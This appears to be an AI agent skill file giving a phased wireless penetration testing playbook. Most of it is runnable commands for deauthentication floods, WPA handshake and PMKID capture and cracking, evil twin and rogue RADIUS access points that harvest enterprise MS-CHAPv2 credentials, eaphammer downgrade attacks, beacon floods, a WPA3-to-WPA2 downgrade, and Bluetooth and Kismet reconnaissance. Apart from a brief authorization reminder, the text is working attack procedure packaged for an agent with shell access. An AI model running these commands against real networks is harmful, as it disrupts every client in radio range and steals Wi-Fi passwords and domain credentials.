---
name: wireless
description: Wireless penetration testing — WPA/WPA2/WPA3 handshake capture, PMKID, evil twin, EAP/PEAP downgrade, rogue AP, deauth, Bluetooth
allowed-tools: [Bash, Read, Write]
---

# Wireless Penetration Testing

Test 802.11 wireless networks and Bluetooth for authentication weaknesses, rogue AP susceptibility,
EAP credential capture, and client-side attacks. **Requires an external wireless adapter supporting
monitor mode and packet injection** (e.g. Alfa AWUS036ACH, AWUS036NH).

> **Authorization reminder**: wireless testing affects all clients in radio range, not just the target
> AP. Confirm scope explicitly covers wireless before starting any phase.

## Tools

| Tool | Purpose |
|------|---------|
| aircrack-ng suite | Monitor mode, capture, WPA crack |
| airodump-ng | Passive AP/client discovery |
| aireplay-ng | Deauth, fake auth, packet injection |
| hcxdumptool | PMKID and EAPOL capture (modern, no deauth needed) |
| hcxtools | Convert captures to hashcat format |
| hostapd-wpe | Rogue AP with WPE (EAP credential capture) |
| bettercap | Evil twin, MITM, Bluetooth recon |
| hashcat | GPU-accelerated WPA/PMKID cracking |
| airbase-ng | Soft AP creation |
| mdk4 | Deauth flood, beacon flood, SSID probing |
| asleap | LEAP/PEAP MS-CHAPv2 cracking |
| eaphammer | Targeted EAP attack framework |

## Phase 0 — Setup

```bash
# Install if needed
sudo apt-get install -y aircrack-ng hcxdumptool hcxtools hostapd-wpe bettercap mdk4

# Identify wireless interfaces
iw dev
iwconfig 2>/dev/null | grep -E "^[a-z]|Mode"

# Set adapter into monitor mode
IFACE="wlan0"   # adjust to your adapter
sudo airmon-ng check kill          # kill interfering processes (NetworkManager, etc.)
sudo airmon-ng start $IFACE
MON="${IFACE}mon"                  # monitor interface name (usually wlan0mon)

# Confirm monitor mode
iwconfig $MON | grep "Mode:Monitor"
```

## Phase 1 — Passive Reconnaissance

```bash
# Discover all APs + clients (all channels)
sudo airodump-ng $MON --write "$OUTPUT_DIR/recon/airodump-passive" --output-format csv,pcap \
  --write-interval 10 &
DUMP_PID=$!
sleep 60
kill $DUMP_PID 2>/dev/null

# Parse discovered APs
echo "=== Access Points ===" && awk -F',' 'NR>2 && $1~/[0-9A-F]{2}:/{printf "BSSID:%-20s CH:%-4s ENC:%-10s ESSID:%s\n",$1,$4,$6,$14}' \
  "$OUTPUT_DIR/recon/airodump-passive-01.csv" | tee "$OUTPUT_DIR/recon/ap-list.txt"

echo "=== Clients ===" && awk -F',' '/Station/{p=1;next} p && $1~/[0-9A-F]{2}:/{print $1,$6}' \
  "$OUTPUT_DIR/recon/airodump-passive-01.csv" | tee "$OUTPUT_DIR/recon/client-list.txt"

# Targeted scan on a specific channel
TARGET_BSSID="AA:BB:CC:DD:EE:FF"
TARGET_CH=6
sudo airodump-ng $MON --bssid $TARGET_BSSID --channel $TARGET_CH \
  --write "$OUTPUT_DIR/recon/airodump-target" --output-format csv,pcap
```

## Phase 2 — WPA2 Handshake Capture

### Method A — Deauth + capture (classic)

```bash
TARGET_BSSID="AA:BB:CC:DD:EE:FF"
TARGET_CH=6
CLIENT_MAC="11:22:33:44:55:66"   # from airodump client list, or FF:FF:FF:FF:FF:FF for broadcast

# Start targeted capture in background
sudo airodump-ng $MON --bssid $TARGET_BSSID --channel $TARGET_CH \
  --write "$OUTPUT_DIR/recon/handshake" --output-format pcap &
DUMP_PID=$!
sleep 3

# Send deauth to force re-authentication
sudo aireplay-ng --deauth 5 -a $TARGET_BSSID -c $CLIENT_MAC $MON
sleep 5
kill $DUMP_PID 2>/dev/null

# Verify handshake captured
aircrack-ng "$OUTPUT_DIR/recon/handshake-01.cap" | grep -i "handshake\|WPA\|1 handshake"
```

### Method B — PMKID capture (clientless, no deauth needed)

```bash
# hcxdumptool captures PMKID during normal beacon exchange — no client required
sudo hcxdumptool -i $MON \
  --enable_status=1 \
  --filterlist_ap="$OUTPUT_DIR/recon/target-bssids.txt" \
  --filtermode=2 \
  -o "$OUTPUT_DIR/recon/pmkid-capture.pcapng" &
HCXD_PID=$!
sleep 120
kill $HCXD_PID 2>/dev/null

# Convert pcapng → hashcat format (22000 = WPA-PBKDF2-PMKID+EAPOL)
hcxpcapngtool -o "$OUTPUT_DIR/recon/hashes-22000.txt" "$OUTPUT_DIR/recon/pmkid-capture.pcapng"
cat "$OUTPUT_DIR/recon/hashes-22000.txt" | head -5
```

## Phase 3 — WPA Cracking

```bash
# Dictionary attack (handshake .cap)
aircrack-ng "$OUTPUT_DIR/recon/handshake-01.cap" \
  -w /usr/share/wordlists/rockyou.txt \
  -b $TARGET_BSSID \
  | tee "$OUTPUT_DIR/logs/aircrack-result.txt"

# hashcat — WPA-PBKDF2-PMKID+EAPOL (mode 22000) — GPU accelerated
hashcat -m 22000 "$OUTPUT_DIR/recon/hashes-22000.txt" \
  /usr/share/wordlists/rockyou.txt \
  --status --status-every 30 \
  -o "$OUTPUT_DIR/artifacts/cracked-wpa.txt" \
  | tee "$OUTPUT_DIR/logs/hashcat-wpa.log"

# Rule-based attack
hashcat -m 22000 "$OUTPUT_DIR/recon/hashes-22000.txt" \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -o "$OUTPUT_DIR/artifacts/cracked-wpa.txt"

# Mask attack (8-digit numeric — common default passwords)
hashcat -m 22000 "$OUTPUT_DIR/recon/hashes-22000.txt" \
  -a 3 "?d?d?d?d?d?d?d?d" \
  -o "$OUTPUT_DIR/artifacts/cracked-wpa.txt"
```

## Phase 4 — Evil Twin / Rogue AP

```bash
# bettercap: create a rogue AP matching the target SSID
# Run bettercap as root on a second interface (or USB adapter)
sudo bettercap -iface eth0 -eval "
  set wifi.interface $MON;
  set wifi.ap.ssid 'TARGET_SSID';
  set wifi.ap.bssid AA:BB:CC:DD:EE:FF;
  set wifi.ap.channel 6;
  wifi.recon on;
  wifi.ap on;
  set http.proxy.script /dev/null;
  net.probe on;
  net.sniff on
" 2>&1 | tee "$OUTPUT_DIR/logs/bettercap-evil-twin.log"

# While evil twin runs, deauth clients from real AP to push them to rogue
sudo aireplay-ng --deauth 0 -a $TARGET_BSSID $MON &
DEAUTH_PID=$!
# Stop after desired duration
sleep 300 && kill $DEAUTH_PID
```

## Phase 5 — WPA-Enterprise / EAP Credential Capture

Enterprise networks (WPA-EAP, PEAP, EAP-TTLS) can be attacked with a rogue RADIUS server
that downgrades to MS-CHAPv2 and captures credential hashes.

### hostapd-wpe (rogue RADIUS + AP)

```bash
# Edit hostapd-wpe config
cat > /tmp/hostapd-wpe-target.conf << EOF
interface=$MON
driver=nl80211
ssid=TARGET_SSID
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh
EOF

# Start rogue AP (captures MS-CHAPv2 hashes to /var/log/hostapd-wpe.log)
sudo hostapd-wpe /tmp/hostapd-wpe-target.conf 2>&1 | tee "$OUTPUT_DIR/logs/hostapd-wpe.log" &
HOSTAPD_PID=$!

# Deauth clients from real AP
sudo aireplay-ng --deauth 5 -a $TARGET_BSSID $MON

# Monitor for captured credentials
tail -f "$OUTPUT_DIR/logs/hostapd-wpe.log" | grep -A3 "mschapv2\|username\|challenge\|response"

# Stop after capture
kill $HOSTAPD_PID
```

### Crack MS-CHAPv2 with asleap or hashcat

```bash
# Extract from hostapd-wpe log
grep -A5 "mschapv2" "$OUTPUT_DIR/logs/hostapd-wpe.log" \
  | tee "$OUTPUT_DIR/artifacts/eap-mschapv2-hashes.txt"

# asleap
asleap -C CHALLENGE_HEX -R RESPONSE_HEX \
  -W /usr/share/wordlists/rockyou.txt \
  | tee "$OUTPUT_DIR/artifacts/eap-cracked.txt"

# hashcat mode 5500 (NetNTLMv1) or 5600 (NetNTLMv2)
hashcat -m 5600 "$OUTPUT_DIR/artifacts/eap-mschapv2-hashes.txt" \
  /usr/share/wordlists/rockyou.txt \
  -o "$OUTPUT_DIR/artifacts/eap-cracked.txt"
```

### eaphammer (targeted EAP attacks)

```bash
# Clone/install
git clone https://github.com/s0lst1c3/eaphammer /opt/eaphammer 2>/dev/null || true
cd /opt/eaphammer && python3 setup.py

# Generate certificates matching real AP (helps bypass client validation warnings)
python3 /opt/eaphammer/eaphammer --cert-wizard

# Launch PEAP/EAP-TTLS downgrade attack
sudo python3 /opt/eaphammer/eaphammer \
  -i $MON \
  --channel 6 \
  --auth wpa-eap \
  --essid TARGET_SSID \
  --creds \
  2>&1 | tee "$OUTPUT_DIR/logs/eaphammer.log"
```

## Phase 6 — Client-Side Probing Attacks

```bash
# mdk4: beacon flood (confuse clients with many SSIDs)
sudo mdk4 $MON b -f "$OUTPUT_DIR/recon/ap-list.txt" -s 200 \
  2>&1 | tee "$OUTPUT_DIR/logs/mdk4-beacon.log"

# mdk4: deauth flood on target AP
sudo mdk4 $MON d -B $TARGET_BSSID -s 100 \
  2>&1 | tee "$OUTPUT_DIR/logs/mdk4-deauth.log"

# Probe request capture — identify clients looking for remembered SSIDs
sudo airodump-ng $MON --write "$OUTPUT_DIR/recon/probe-capture" --output-format csv &
sleep 60 && kill %1
awk -F',' 'NR>2 && $7~/[a-zA-Z0-9]/{print $1,$7}' \
  "$OUTPUT_DIR/recon/probe-capture-01.csv" \
  | sort -u | tee "$OUTPUT_DIR/recon/probe-ssid-list.txt"
# Each SSID in probe-ssid-list.txt is a remembered network — impersonate it for targeted evil twin
```

## Phase 7 — WPA3 / SAE Testing

```bash
# WPA3 uses Simultaneous Authentication of Equals (SAE) — resistant to offline dict attacks
# Key attack vectors:
# 1. Downgrade to WPA2 if mixed-mode (WPA2/WPA3 transition mode) is enabled
# 2. DragonBlood side-channel (CVE-2019-9494, CVE-2019-9496) — check version

# Check for transition mode (AP advertises both WPA2 and WPA3)
sudo airodump-ng $MON --bssid $TARGET_BSSID --channel $TARGET_CH \
  --write "$OUTPUT_DIR/recon/wpa3-scan" --output-format csv
grep -i "SAE\|WPA3\|transition" "$OUTPUT_DIR/recon/wpa3-scan-01.csv"

# If transition mode detected → deauth WPA3-capable client
# Client may re-associate using WPA2 → capture handshake normally (Phase 2)
sudo aireplay-ng --deauth 10 -a $TARGET_BSSID -c $CLIENT_MAC $MON

# Check for DragonBlood CVEs using known PoC
python3 tools/nvd-lookup.py CVE-2019-9494 2>/dev/null
searchsploit CVE-2019-9494
```

## Phase 8 — Bluetooth Reconnaissance

```bash
# Classic Bluetooth discovery
hciconfig hci0 up
hcitool scan | tee "$OUTPUT_DIR/recon/bt-classic-scan.txt"
hcitool inq | tee "$OUTPUT_DIR/recon/bt-inquiry.txt"

# BLE scanning
sudo hcitool lescan --duplicates 2>/dev/null | tee "$OUTPUT_DIR/recon/ble-scan.txt" &
sleep 30 && kill %1

# bettercap BLE enumeration
sudo bettercap -iface $IFACE -eval "
  ble.recon on;
  sleep 30;
  ble.show
" 2>&1 | tee "$OUTPUT_DIR/recon/bettercap-ble.log"

# Bluez / btlejack for BTLE sniffing (requires compatible hardware e.g. Ubertooth)
# ubertooth-btle -f -A 37 -c "$OUTPUT_DIR/recon/ubertooth-btle.pcap"
```

## Cleanup

```bash
# Restore adapter to managed mode
sudo airmon-ng stop $MON
sudo ip link set $IFACE up
sudo systemctl restart NetworkManager

# Remove temp configs
rm -f /tmp/hostapd-wpe-target.conf
```

## Phase 9 — Kismet Passive Multi-Protocol Detection

Kismet passively detects WiFi, Bluetooth, BLE, Zigbee, and Z-Wave without transmitting —
ideal for stealthy IoT/RF recon or environments where active scanning is restricted.

### Hardware Requirements

| Protocol | Hardware |
|---|---|
| WiFi (802.11) | Any monitor-mode adapter (e.g. Alfa AWUS036ACH) |
| Bluetooth / BLE | Ubertooth One, or built-in hci0 via BlueZ |
| Zigbee (802.15.4) | TI CC2531 USB dongle (with cc2531 firmware), YARD Stick One |
| Z-Wave | YARD Stick One (with Z-Wave firmware) |
| SDR (general RF) | HackRF One, RTL-SDR (rtl2832u) |

### Install & Launch

```bash
sudo apt-get install -y kismet

# Edit /etc/kismet/kismet.conf to add your sources before starting
# Or pass sources on the command line

# Start Kismet server (headless — REST API on port 2501)
sudo kismet \
  --no-ncurses \
  --source "$MON:name=wifi_mon" \
  --source "hci0:name=bluetooth" \
  -l "$OUTPUT_DIR/recon/kismet" \
  --override kismet_logging.conf \
  2>&1 | tee "$OUTPUT_DIR/logs/kismet.log" &
KISMET_PID=$!

# Or start with web UI (browse to http://localhost:2501)
sudo kismet --source "$MON" &

echo "[+] Kismet running (PID $KISMET_PID). Web UI: http://localhost:2501"
sleep 10   # let it collect initial devices
```

### REST API — Export Discovered Devices

```bash
KISMET_USER="kismet"
KISMET_PASS="kismet"   # default; change in /etc/kismet/kismet_httpd.conf
BASE="http://localhost:2501"
AUTH="--user $KISMET_USER:$KISMET_PASS"

# Dump all devices to JSON
curl -s $AUTH \
  "$BASE/devices/all_devices.json" \
  | jq '[.[] | {
      mac:       .["kismet.device.base.macaddr"],
      name:      .["kismet.device.base.name"],
      type:      .["kismet.device.base.type"],
      phyname:   .["kismet.device.base.phyname"],
      signal:    .["kismet.device.base.signal"]["kismet.common.signal.last_signal"],
      first_seen:.["kismet.device.base.first_time"],
      last_seen: .["kismet.device.base.last_time"],
      packets:   .["kismet.device.base.packets.total"],
      manuf:     .["kismet.device.base.manuf"]
    }]' \
  | tee "$OUTPUT_DIR/recon/kismet-devices.json"

echo "[+] Devices found: $(jq length $OUTPUT_DIR/recon/kismet-devices.json)"

# WiFi APs only
jq '[.[] | select(.phyname == "IEEE802.11" and .type == "Wi-Fi AP")]' \
  "$OUTPUT_DIR/recon/kismet-devices.json" \
  | tee "$OUTPUT_DIR/recon/kismet-wifi-aps.json"

# Bluetooth / BLE devices only
jq '[.[] | select(.phyname | test("Bluetooth|BTLE"; "i"))]' \
  "$OUTPUT_DIR/recon/kismet-devices.json" \
  | tee "$OUTPUT_DIR/recon/kismet-bluetooth.json"

# Zigbee devices
jq '[.[] | select(.phyname == "IEEE802.15.4")]' \
  "$OUTPUT_DIR/recon/kismet-devices.json" \
  | tee "$OUTPUT_DIR/recon/kismet-zigbee.json"
```

### IoT Device Fingerprinting

```bash
# OUI (MAC prefix) → manufacturer lookup for IoT fingerprinting
python3 << 'EOF'
import json, subprocess

devices = json.load(open("OUTPUT_DIR/recon/kismet-devices.json"))
iot_keywords = ["camera", "thermostat", "lock", "bulb", "ring", "nest",
                "philips", "samsung", "amazon", "google", "sonos",
                "lifx", "wemo", "tp-link", "arlo", "august"]

print("\n=== Potential IoT Devices ===")
for d in devices:
    manuf = (d.get("manuf") or "").lower()
    name  = (d.get("name")  or "").lower()
    if any(k in manuf or k in name for k in iot_keywords):
        print(f"  [{d['phyname']:12s}] {d['mac']:17s}  {d.get('manuf','?'):25s}  {d['name']}")
EOF

# Export unknown devices (no manufacturer = potentially interesting)
jq '[.[] | select(.manuf == "" or .manuf == null) | {mac, type, phyname, signal}]' \
  "$OUTPUT_DIR/recon/kismet-devices.json" \
  | tee "$OUTPUT_DIR/recon/kismet-unknown-manuf.json"
```

### Correlating Kismet Discovery with Active airodump-ng

```bash
# Extract SSID list from Kismet AP records
jq -r '[.[] | select(.phyname == "IEEE802.11" and .type == "Wi-Fi AP") | .name] | unique[]' \
  "$OUTPUT_DIR/recon/kismet-wifi-aps.json" \
  | tee "$OUTPUT_DIR/recon/kismet-ssid-list.txt"

# Extract BSSIDs to target with airodump-ng
jq -r '[.[] | select(.phyname == "IEEE802.11" and .type == "Wi-Fi AP") | .mac] | .[]' \
  "$OUTPUT_DIR/recon/kismet-wifi-aps.json" \
  | tee "$OUTPUT_DIR/recon/kismet-bssid-list.txt"

# Build hcxdumptool filter file (PMKID capture against discovered APs)
# Convert MACs from XX:XX:XX:XX:XX:XX to lowercase no-colon format
jq -r '[.[] | select(.phyname == "IEEE802.11") | .mac | ascii_downcase | gsub(":";"")] | .[]' \
  "$OUTPUT_DIR/recon/kismet-wifi-aps.json" \
  > "$OUTPUT_DIR/recon/target-bssids.txt"

echo "[+] $(wc -l < $OUTPUT_DIR/recon/target-bssids.txt) BSSIDs ready for hcxdumptool"

# Now target specific APs with airodump-ng
TARGET_BSSID=$(head -1 "$OUTPUT_DIR/recon/kismet-bssid-list.txt")
TARGET_CH=$(jq -r --arg bssid "$TARGET_BSSID" \
  '.[] | select(.mac == $bssid) | .channel // "6"' \
  "$OUTPUT_DIR/recon/kismet-wifi-aps.json" | head -1)
sudo airodump-ng "$MON" --bssid "$TARGET_BSSID" --channel "$TARGET_CH" \
  --write "$OUTPUT_DIR/recon/targeted-capture"
```

### Kismet Wireless IDS Mode

```bash
# Kismet can alert on suspicious activity (deauth floods, evil twins, rogue APs)
# Fetch active alerts via REST API
curl -s $AUTH "$BASE/alerts/all_alerts.json" \
  | jq '[.[] | {type: .["kismet.alert.type"], text: .["kismet.alert.text"], time: .["kismet.alert.timestamp"]}]' \
  | tee "$OUTPUT_DIR/logs/kismet-alerts.json"

# Stop Kismet and save final state
kill $KISMET_PID 2>/dev/null
# Kismet saves .kismet and .pcapng logs to OUTPUT_DIR/recon/kismet.*
```

## Key Checks by Wireless Security Category

| Category | Check | Tools |
|----------|-------|-------|
| WPA2-Personal | PMKID or handshake capturable, weak PSK | hcxdumptool, hashcat |
| WPA2-Enterprise | EAP downgrade to MS-CHAPv2, no mutual auth | hostapd-wpe, eaphammer |
| WPA3-SAE | Transition mode → WPA2 downgrade, DragonBlood | airodump-ng, CVE PoC |
| Open/WEP | Plaintext/IV reuse, trivially cracked | aircrack-ng |
| Evil Twin | Clients connecting to rogue AP | bettercap, hostapd-wpe |
| Client probing | Devices advertising remembered SSIDs | airodump-ng, mdk4 |
| Deauth DoS | No management frame protection (MFP/802.11w) | aireplay-ng, mdk4 |
| Bluetooth | Discoverable devices, BLE pairing | hcitool, bettercap |

## Output

```
OUTPUT_DIR/
├── recon/
│   ├── airodump-passive-01.csv     ← all APs and clients
│   ├── airodump-target-01.pcap     ← targeted capture
│   ├── handshake-01.cap            ← WPA2 4-way handshake
│   ├── pmkid-capture.pcapng        ← PMKID pcapng
│   ├── hashes-22000.txt            ← hashcat-ready hashes
│   ├── probe-ssid-list.txt         ← client remembered SSIDs
│   └── ap-list.txt                 ← discovered APs
├── logs/
│   ├── hostapd-wpe.log             ← EAP credential captures
│   ├── eaphammer.log               ← PEAP downgrade captures
│   ├── hashcat-wpa.log             ← cracking progress
│   └── bettercap-evil-twin.log
└── artifacts/
    ├── cracked-wpa.txt             ← cracked PSK (never commit)
    └── eap-cracked.txt             ← cracked domain credentials (never commit)
```
